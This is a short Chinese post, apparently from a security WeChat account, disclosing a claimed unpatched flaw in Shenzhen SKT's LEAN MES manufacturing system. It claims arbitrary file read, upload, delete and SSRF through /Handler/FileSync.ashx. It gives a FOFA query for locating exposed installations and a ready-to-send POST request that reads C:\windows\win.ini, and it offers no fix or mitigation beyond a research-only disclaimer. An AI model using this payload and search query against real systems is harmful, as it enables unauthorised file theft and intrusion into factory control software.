#  【0day】深科特 LEAN MES系统 /Handler/FileSync.ashx 任意文件读取/上传/删除/SSRF等多个漏洞  
 0day收割机   2026-03-25 10:37  
  
# 漏洞简介  
  
LEAN MES系统是由深圳市深科特信息技术有限公司开发的一款应用系统，主要用于生产调度、产品跟踪、质量控制等车间管理功能。LEAN MES精益制造执行系统通过强调制造过程的信息化和透明化，帮助企业由粗放式向精益化管理模式升级。该系统/Handler/FileSync.ashx接口存在任意文件上传/读取/删除/SSRF等多个漏洞，攻击者可以利用这些漏洞在服务器执行任意代码、命令，或探测内容资产等高危行为。  
# 影响版本  
# fofa语法  
> (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"  
  
# 漏洞复现  
```
POST /Handler/FileSync.ashx HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

type=DownLoad&sourceFilePath=C:\windows\win.ini
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWCx4sIS2Xq68nXpJ06OEmicwIuSRVMpHboEIvbt2dxEib35x3ja9XagKUiae7x4k207PfBGGtU0zsQjSDZISAqBibTu05FtjAmWOuM/640?wx_fmt=png&from=appmsg "")  
  
成功读取到**C:\windows\win.ini**  
 文件内容  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
